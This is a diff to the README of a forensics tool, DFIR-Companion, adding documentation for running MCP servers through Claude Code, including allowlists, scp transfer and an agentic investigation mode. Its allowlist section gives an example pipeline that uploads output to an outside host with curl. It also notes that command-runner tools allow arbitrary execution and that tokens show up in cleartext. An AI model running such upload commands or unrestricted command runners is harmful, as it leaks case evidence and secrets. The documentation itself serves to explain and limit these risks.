@@ -40,6 +40,7 @@ User Manual: https://hasamba.github.io/DFIR-Companion/manual/
 - [Screenshots](#screenshots)
 - [What it produces](#what-it-produces)
 - [Features](#features)
+- [Using your MCP servers](#using-your-mcp-servers)
 - [Repository layout](#repository-layout)
 - [How the pieces fit](#how-the-pieces-fit)
 - [Environment variables (`companion/.env`)](#environment-variables-companionenv)
@@ -238,6 +239,7 @@ list of known compromised hosts and users.
 - **Import screenshots** — multi-select PNG/JPEG/WebP; single **Import** button auto-detects artifact format (CSV/JSON/log)
 - **Evidence drop folder** — each case has a `drop/` folder; anything copied in (subfolders included) is auto-imported in the background via the same chain as the Import button (images → screenshot evidence), then moved to `_processed/` or `_failed/`; failures surface in a dashboard banner + notifications; every outcome (imported/failed/pending, with reason) is appended to a running `drop-log.txt` in the same folder
 - **External tool runner** (Settings → Tools) — run your **own locally-installed** Hayabusa / Velociraptor CLI / Suricata / Snort / YARA against raw evidence the Companion can't parse (EVTX/PCAP/files), then ingest the tool's *output* through the existing importers. Configure the binary path + args per tool (never bundled/downloaded). Importing a raw EVTX/PCAP from the dashboard — or dropping raw files in a case's `drop/` folder — shows a header banner that **asks once per batch** before running (auto-run is opt-in per tool); each tool also has a one-click "update rules" button. **Add your own custom tools** too (name, binary, command, update command, extensions) — their output is auto-detected and routed to the right importer. No-shell argv, path-contained, runs from the tool's own dir, off by default
+- **MCP through Claude Code** (Settings → Tools) — point case evidence at the MCP servers **you already configured in Claude Code** (SIFT, REMnux, windows-triage). The Companion does not speak MCP, stores no server URL or token, and spawns no `npx`: it asks Claude Code, which holds the credentials, to make the call. **Requires Claude Code installed and authenticated on the Companion host.** By default a server may run **everything it offers**. Optional per-server **tool** and **command** allowlists can narrow that, and you configure how evidence reaches it. Read [Using your MCP servers](#using-your-mcp-servers) before using one that exposes a command runner: that means command execution on that host
 - **Import undo/redo** — roll back/forward to exact pre-import state (no re-synthesis); multi-level per-case stack
 - **Custom (declarative) importers** — teach a new file format with a JSON definition (no code); LLM-authorable via a built-in prompt, auto-detected + imported like a built-in, with built-in/custom precedence
 - **Evidence-first** — written to disk + audit log before analysis; SHA-256 dedup (disable via `DFIR_DEDUP=off`)
@@ -430,6 +432,202 @@ All importers are **deterministic (no AI call)**, read the artifact's own timest
 - **Demo case** — one-click load or `npm run seed-demo` to seed GlobalTech scenario
 - **CLI scripts** — `reanalyze`, `synthesize`, `coverage`, `verify:ai`, `clean-timeline`
 
+## Using your MCP servers
+
+The Companion can point case evidence at MCP servers **you** run — a SIFT workstation, a REMnux box,
+a Windows triage baseline service — so evidence is analysed on a machine that has the tooling.
+
+**It reaches them only through Claude Code.** The Companion is not an MCP client: it holds no server
+URL, no bearer token, and starts no `npx` or `uvx` of its own. Claude Code is already configured with
+your servers and already holds their credentials, so it does the talking and the Companion asks it
+to.
+
+### Prerequisites
+
+This whole feature works **only if**:
+
+1. **Claude Code is installed and authenticated on the machine running the Companion** — not on your
+   laptop, on the Companion host. Set `DFIR_AI_CLAUDE_CODE_BIN` if `claude` is not on its `PATH`.
+2. **Your MCP servers are configured in Claude Code** (`claude mcp add …`, or its config file), and
+   `claude mcp list` shows them connected.
+
+There is no fallback. If you run the Companion in Docker, from the AppImage, or from the portable
+Windows build without Claude Code alongside it, the MCP routes will tell you so and nothing else.
+
+Two consequences worth knowing before you rely on it. Every MCP call goes through a model, so it
+spends tokens and is not the bit-for-bit deterministic call a direct JSON-RPC request would be — the
+prompt makes it a transport (one tool, exact arguments, verbatim output) but a model is still in the
+middle. And because the servers come from Claude Code's own configuration rather than a generated
+one, Claude Code starts *every* server it is configured with on each run, not just the one being
+used; the allowlist bounds what may be *called*, not what gets launched.
+
+In **Settings → Tools**, press **Refresh from Claude Code** to load its server list, then allow one
+and say what it may do. There is nothing to type but policy — the server names come from Claude Code
+itself, so a typo cannot leave you with an entry that silently matches nothing.
+
+### Running a tool against case evidence
+
+`POST /cases/<id>/mcp/<serverId>/run` with `{ tool, args, targetPath }`. Put `<target>` wherever the
+tool expects the evidence path — it is replaced with the path *on the analysis host* after delivery
+has run, so the argument you write is the argument the tool receives:
+
+```json
+{ "tool": "run_command",
+  "args": { "command": ["vol.py", "-f", "<target>", "pslist"] },
+  "targetPath": "imports/memory.raw" }
+```
+
+`targetPath` is resolved inside the case directory; anything outside it is refused. For a sample the
+browser holds and the server has no path to, `POST /cases/<id>/mcp/<serverId>/run-upload` takes
+`{ filename, dataBase64 }` instead and stages the bytes inside the case first.
+
+Both return **202 with a job id** rather than blocking. A real Volatility run outlives any sensible
+request timeout, so the run is a background job with progress, a cancel button, and a WebSocket
+`job_changed` broadcast. The result flows into the case through the same import chain as every other
+tool — timeline events, findings and IOCs, with an undo checkpoint — so nothing about reading the
+result differs from an ordinary import. Structured output is routed to the matching importer;
+unstructured prose falls through to the generic log path rather than being rejected.
+
+A tool that reports its own failure fails the job instead of being ingested: an error message is a
+diagnostic, not an artifact, and filing it in the timeline would make it look like evidence.
+
+### Preview before importing
+
+**On by default**, and worth leaving on. An MCP server will return reference data as readily as
+evidence — ask SIFT what tools it has and you get a JSON inventory that is structurally identical to
+a Volatility table: an array of objects with no timestamps. No detector can tell them apart, so the
+importers do what they are built to do and extract every path in it as a file indicator. One
+capability listing is a few dozen IOCs the case never wanted.
+
+With preview on, the run fetches the output and stops. You see the bytes, the size, and the kind it
+*would* import as, and choose. Approving ingests **exactly the bytes already fetched** — it never
+re-runs the tool, so a twenty-minute Volatility run costs twenty minutes once, and a tool with side
+effects performs them once. Discarding throws the output away and the case is untouched.
+
+Send `preview: true` on the run to use it from the API, then `GET`,
+`POST …/import` or `DELETE` on `/cases/<id>/mcp/preview/<jobId>`.
+
+Nothing here is a substitute for judgement about what to run, and importing without preview is not
+dangerous — every MCP import pushes an undo checkpoint, so a run that turns out to be noise is one
+click from being rolled back.
+
+### What using a server grants
+
+**By default, everything the server offers.** That is deliberate: Claude Code already lets you call
+any tool on any server you configured, so requiring you to re-enumerate them here would have been
+stricter than your own daily use — and a second place to describe the same server.
+
+Worth knowing what "everything" includes. Some servers expose fine-grained tools — `check_service`,
+`check_autorun`, one per question. Others expose a single **command runner** that executes whatever
+you hand it: SIFT's `run_command` states it can execute "most SIFT-installed tools … including curl,
+wget, dd, fdisk, and python3", and REMnux's `run_tool` takes an entire shell pipeline. Using such a
+server from the Companion means command execution on that host — reasonable on an isolated forensics
+network, where the analysis boxes are yours and the evidence is already on your LAN, and not
+reasonable anywhere else.
+
+Two **optional** lists narrow it when you want that:
+
+| Setting | Applies to | Blank means |
+|---|---|---|
+| **Restrict to tools** | every call | every tool the server offers |
+| **Restrict to commands** | calls carrying a command argument | no command restriction |
+
+Commands are matched **by basename**, so `grep` and `/usr/bin/grep` are one rule. Every stage of a
+pipeline is checked, not just the first — `oledump.py s.doc | curl -T - http://elsewhere` needs both
+`oledump.py` and `curl` permitted. A command using shell substitution (`$(…)`, backticks, `${…}`) is
+refused outright, because what it would run cannot be known in advance.
+
+**What the command list does not do.** It bounds *which* binaries run, never what a permitted one can
+do — permitting `dd` permits writing to any path that server's user can write to; permitting
+`python3` permits arbitrary code. It also keys on well-known parameter names (`command`, `cmd`,
+`argv`), so a server naming its command parameter something unusual is not caught. It exists to help
+an operator who wants to narrow their own access, not to contain a server they should not have
+configured in the first place.
+
+### Getting evidence to the server
+
+MCP has no file-transfer primitive and a multi-gigabyte memory image cannot travel inside a tool
+argument, so the file has to already be somewhere the server can open it. This part stays the
+Companion's job — Claude Code cannot move an image onto an analysis box. Each server picks one of
+two routes:
+
+**`remote-path`** (default) — the evidence is already visible to the analysis host over a shared
+mount. Set a local prefix and a remote prefix and the path is rewritten (`/srv/cases/…` →
+`/mnt/dfir/…`); leave both empty when the mount is at the same path on both sides. Nothing is
+copied.
+
+**`scp`** — the Companion pushes the file to a staging directory, the tool runs, and the staged copy
+is deleted afterwards. Configure `host`, `remoteDir`, optionally `user`, `port` and `identityFile`.
+
+Four things to know before choosing `scp`:
+
+- **The host key must already be trusted.** `BatchMode` is on and `StrictHostKeyChecking` is *not*
+  disabled, so an unknown host fails with `Host key verification failed` rather than trusting
+  whatever answered the address. Connect once by hand (or add the key to `known_hosts`) first. This
+  is deliberate: silently accepting an unverified key would hand evidence to anyone holding the IP.
+- **Authentication is key-based only.** `BatchMode` means ssh never prompts, so a password-only host
+  cannot work. Point `identityFile` at a key with no passphrase, or load it into an agent the server
+  process can reach.
+- **There is no progress and no resume.** A 16 GB copy is opaque until it finishes or fails, and a
+  dropped connection means starting over. The transfer is cancellable and has its own hour-long
+  timeout, separate from the tool-call timeout.
+- **Host, user and remote directory are restricted to a conservative charset** (letters, digits,
+  dot, dash, underscore, and `/` for the directory). `user@host` reaches ssh unquoted, so anything
+  with shell meaning is refused when you save it rather than at transfer time. The staged filename
+  is derived from the evidence name and sanitized the same way.
+
+Either route records a **chain-of-custody `transferred` event** naming the destination, so a case
+file shows that evidence left this machine, when, and to where. A transfer that fails records
+nothing — the chain never claims a copy that did not happen.
+
+### Plain-English MCP investigations
+
+A single tool call cannot follow a thread. "Investigate this dump" wants a loop — run pslist, notice
+something, pivot to malfind — and that is what agentic mode does: it lets Claude Code drive against
+the server you allowed, then merges what it reports. This is the primary MCP workflow in the
+dashboard: write the goal in plain English, select or browse to the evidence, choose the MCP app,
+and press **Investigate**. Tool names and JSON arguments are available only under the advanced
+manual-call section.
+
+`POST /cases/<id>/mcp/agent` with `{ prompt, servers?, targetPath?, preview? }`, or
+`POST /cases/<id>/mcp/agent-upload` with `{ prompt, servers, filename, dataBase64, preview? }`.
+
+**Read this before allowing a server.** In a manual run the Companion controls each call, so every call
+passes the tool *and* command allowlists. In agentic mode it is not: `claude` talks to the servers
+directly. Only the tool allowlist survives, as `--allowed-tools`. **The command allowlist cannot be
+enforced.** Letting an agent use a command-runner tool therefore grants an autonomous loop the
+ability to choose its own command lines on that host.
+
+Allowing and enabling an MCP server in Companion is the permission boundary for this mode. The
+server's tool restriction still applies. A command restriction cannot constrain the autonomous
+loop; it applies only to advanced manual calls.
+
+What the mode still guarantees: an explicit tool restriction is passed through tool by tool; a
+blank restriction deliberately permits every tool that server exposes. Project/local settings,
+`CLAUDE.md` files and hooks are excluded, and the run is turn-limited. Claude Code's user settings
+remain enabled because that is where its MCP server connections live.
+
+The agent's reply is schema-validated and stripped of provenance claims before it is merged —
+everything it saw came from tool output, which is untrusted. It is never asked for a case summary,
+so a run adds findings, IOCs and events without rewriting your conclusions. Preview works here too,
+and matters more: an autonomous loop decides for itself what to report.
+
+The investigation is capped at 40 turns. If Claude Code consumes that budget while using tools,
+Companion resumes the same session once with all tools disabled and asks it to report only from the
+evidence already collected. This preserves the safety boundary without losing a completed
+investigation merely because its final JSON would have been the next turn.
+
+### Credentials
+
+There are none to configure here. Bearer tokens, headers and transports all live in Claude Code's own
+MCP configuration, which is the only place that holds them. The Companion stores a server *name*, an
+allowlist and a delivery block — nothing that would let it connect to anything on its own.
+
+One caveat if you go looking: `claude mcp list` prints each server's full command line, which for an
+`mcp-remote` entry includes the bearer token in cleartext. The Companion parses only the name and the
+health verdict out of that output and never stores, logs or renders the rest — but be careful where
+you run that command yourself.
+
 ## Repository layout
 
 ```
@@ -465,10 +663,10 @@ attacker path, questions). Configure both via `.env` — see `companion/README.m
 
 ## Quick start
 
-> **Prerequisite:** [Node.js](https://nodejs.org/) **20 or later** (which ships with `npm`).
+> **Prerequisite:** [Node.js](https://nodejs.org/) **22.5 or later** (which ships with `npm`).
 > Check with `node --version`. Everything below uses `npm`, so no other runtime is needed.
-> One optional feature — the **NSRL RDS SQLite backend** — needs **Node 22.5+** for the
-> built-in `node:sqlite` module; everything else (including the flat NSRL hash list) runs on Node 20.
+> Indexed case storage uses the built-in `node:sqlite` module, so older Node releases cannot open
+> cases. The portable build bundles a compatible runtime.
 
 1. **Companion** (the server):
 
@@ -857,6 +1055,16 @@ uploaded JSON does; it's auto-detected and routed to the right importer), then s
 now** on the live job card to pull early. The in-flight job persists per case (`state/velo-hunt.json`) and
 survives a server restart; results appear on the dashboard timeline/IOCs.
 
+### MCP servers (optional)
+
+| Variable | Default | Description |
+|---|---|---|
+| `DFIR_MCP_MODEL` | (CLI default) | Model used for single MCP tool calls, passed to `claude --model`. |
+| `DFIR_MCP_AGENT_MODEL` | (CLI default) | Model for the agentic loop, passed to `claude --model`. |
+
+Registering a server is a security decision, not just configuration — see
+[Registering an MCP server](#registering-an-mcp-server).
+
 ### Notifications (optional)
 
 Push **new/escalated findings**, **playbook updates**, and **investigation milestones** to **Slack** /
@@ -1053,7 +1261,7 @@ npm run verify:ai -- mycase --provider openrouter --model openai/gpt-4o --key sk
 ### `npm run coverage -- [caseId]`
 
 Reports how many of a case's screenshots were analyzed vs. skipped (duplicates) vs.
-never touched. Reads only `captures.jsonl` and `investigation.json` — no AI calls.
+never touched. Reads only `captures.jsonl` and the indexed investigation state — no AI calls.
 
 | Arg | Default | Effect |
 | --- | --- | --- |
@@ -1244,4 +1452,3 @@ In short: you're free to use, study, modify, and share it — but if you distrib
 version **or run a modified version as a network service**, you must make your complete source
 code available to its users under the same license. (This is the DFIR-tooling norm — Velociraptor,
 MISP, and TheHive are AGPL too.)
-
